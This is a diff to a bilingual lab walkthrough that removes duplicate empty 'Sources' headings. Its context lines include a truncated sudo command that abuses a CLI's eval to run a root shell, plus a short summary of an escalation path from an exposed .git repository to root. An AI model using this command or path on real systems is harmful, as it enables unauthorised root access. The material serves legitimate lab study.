@@ -26,9 +26,6 @@
 
 ---
 
-## Fuentes / Sources
-
-
 ## 🛠️ Herramientas usadas / Tools used
 
 - [ ] nmap / fscan
@@ -39,9 +36,6 @@
 - [ ] ssh / su
 
 ---
-
-## Fuentes / Sources
-
 
 ## 📋 Pasos / Steps
 
@@ -129,9 +123,6 @@ sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c
 
 ---
 
-## Fuentes / Sources
-
-
 ## 🧠 Lo aprendido / Learned
 
 > **ES:** Un `.git` público equivale a código fuente + secretos; tras RCE, probar cada secreto en `su`/SSH; los `sudo` a CLIs con `eval` son root directo.
@@ -144,9 +135,6 @@ sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c
 
 ---
 
-## Fuentes / Sources
-
-
 ## 📚 Fuentes y Referencias / Sources
 
 - **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
@@ -156,9 +144,6 @@ sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c
 - **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
 
 ---
-
-## Fuentes / Sources
-
 
 ## ⚠️ Aviso Legal / Disclaimer
 
